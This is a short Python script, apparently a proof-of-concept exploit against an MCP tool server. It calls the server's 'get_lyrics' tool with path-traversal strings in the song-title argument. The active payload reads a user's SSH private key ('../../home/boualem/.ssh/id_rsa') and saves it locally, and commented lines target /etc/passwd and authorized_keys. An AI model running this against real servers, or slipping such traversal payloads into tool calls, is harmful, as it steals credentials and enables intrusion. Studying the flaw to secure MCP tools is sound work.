import asyncio
from fastmcp import Client
import json

client = Client("http://127.0.0.1:8080/mcp") # CHANGE IP


async def main():
    async with client:
        # You can check if server is up
        up = await client.ping()
        if up:
            print("Server is up !\n")
        else:
            print("Server down...")
            exit(-1)

        # List available tools
        tools = await client.list_tools()
        for tool in tools: # pretty print
            print(json.dumps(tool.model_dump(),indent=4))

        # payload = "test"
        # payload = "didi.txt"
        # payload = "../../etc/passwd"
        # payload = "../../home/boualem/.ssh/authorized_keys"
        payload = "../../home/boualem/.ssh/id_rsa"
        result = await client.call_tool("get_lyrics", {"song_title": payload})
        print(f"\nResult:\n{result.structured_content['result']}")
        with open("private_key","w") as f:
            f.write(result.structured_content['result'])


asyncio.run(main())